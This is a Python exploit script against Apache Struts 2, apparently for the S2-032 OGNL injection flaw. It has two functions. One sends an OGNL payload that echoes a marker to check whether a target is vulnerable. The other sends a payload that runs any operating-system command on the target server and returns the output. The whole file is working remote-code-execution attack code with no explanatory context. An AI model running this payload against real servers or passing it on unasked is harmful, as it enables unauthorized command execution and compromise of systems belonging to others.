# -*- coding: utf-8 -*-


import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp_check(url):
    poc='032'
    payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '', 'poc': poc}
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    try:
        r = requests.get(url, params=payload, timeout=5,headers=headers)
        if poc in r.text:
            return 1
        return 2
    except:
        return 3

def exp_cmd(url, cmd):
    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="+cmd+"&pp=____A&ppp=%20&encoding=UTF-8"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    target = url + payload
    try:
        r = requests.get(target, headers=headers, timeout=5)
        #print(r.text)
        return r.text
    except:
        return 3

if __name__ == '__main__':
    pass
    # url = sys.argv[1]
    # cmd=sys.argv[2]
    # print(exp_check(url))
    # exp_cmd(url,cmd)
